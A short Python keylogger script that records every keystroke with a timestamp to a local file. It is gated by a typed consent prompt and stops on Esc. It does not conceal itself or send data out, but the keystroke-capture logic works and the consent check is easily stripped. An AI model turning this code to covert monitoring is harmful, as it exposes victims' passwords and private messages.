import pynput
from pynput.keyboard import Key, Listener
import time
import os

LOG_FILE = "keylog.txt"

def check_consent():
    print("\n=== Keylogger Program ===")
    print("This program will log your keystrokes for authorized and ethical purposes only.")
    print("By proceeding, you confirm that you have explicit permission to use this tool.")
    consent = input("Do you agree to these terms? (yes/no): ").strip().lower()
    if consent != "yes":
        print("Exiting program. Consent is required to proceed.")
        exit()

def write_to_file(data):
    with open(LOG_FILE, "a") as log_file:
        log_file.write(data)

def format_log(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    key = str(key).replace("'", "") 
    return f"[{timestamp}] {key}\n"

def on_press(key):
    try:
        log_entry = format_log(key)
        write_to_file(log_entry)
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    if key == Key.esc:  
        print("\nKeylogger stopped. Logs saved to 'keylog.txt'.")
        return False

def main():
    check_consent()

    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    print("\nKeylogger started. Press 'Esc' to stop logging.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
